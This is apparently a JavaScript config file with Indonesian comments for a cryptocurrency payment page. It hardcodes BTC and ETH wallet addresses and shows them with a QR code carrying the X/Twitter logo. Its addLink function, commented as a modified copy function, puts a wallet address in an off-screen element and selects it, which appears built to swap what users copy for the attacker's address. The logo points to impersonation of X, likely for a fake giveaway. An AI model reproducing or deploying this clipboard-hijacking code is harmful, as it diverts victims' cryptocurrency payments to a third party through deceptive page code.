// config.js
const CONFIG = {
    BTC: 'bc1qv59elk553myrsrd3mhkwwvszf2uxnwp9ssh9cz', // Alamat BTC
    ETH: '0xA83E7b2975D8e6D8eb5e43C7b2753a64D7e9B4eC' // Alamat ETH
};
// Fungsi untuk mengisi semua elemen dengan alamat
function fillAddresses(type) {
    // Ambil semua elemen dengan id trnsctin
    const elements = document.querySelectorAll('#trnsctin');
    elements.forEach(element => {
        element.textContent = CONFIG[type];
    });
}

// Fungsi copy yang dimodifikasi
function addLink() {
    var t = window.getSelection(),
    e = document.createElement("div");
    e.style.position = "absolute";
    e.style.left = "-99999px";
    document.body.appendChild(e);
    // Menggunakan alamat dari config
    e.innerHTML = window.ADDRESS;
    t.selectAllChildren(e);
    window.setTimeout(function() {
        document.body.removeChild(e)
    }, 100)
}

function generateQRWithLogo(type) {
    const qrContainer = document.getElementById('qr-code');
    qrContainer.innerHTML = '';
    
    // Buat QR code
    const qr = new QRCode(qrContainer, {
        text: CONFIG[type],
        width: 150,
        height: 150,
        colorDark: "#000000",
        colorLight: "#ffffff",
        correctLevel: QRCode.CorrectLevel.H  // Gunakan level H untuk ruang logo
    });

    // Tambahkan logo setelah QR terbentuk
    setTimeout(() => {
        const qrImg = qrContainer.querySelector('img');
        const logo = document.createElement('img');
        logo.src = 'https://static.vecteezy.com/system/resources/previews/042/148/611/non_2x/new-twitter-x-logo-twitter-icon-x-social-media-icon-free-png.png';  // Sesuaikan path ke logo Anda
        logo.style.width = '80px';  // Sesuaikan ukuran logo
        logo.style.height = '80px';
        logo.style.position = 'absolute';
        logo.style.top = '50%';
        logo.style.left = '50%';
        logo.style.transform = 'translate(-50%, -50%)';
        qrContainer.style.position = 'relative';
        qrContainer.appendChild(logo);
    }, 100);
}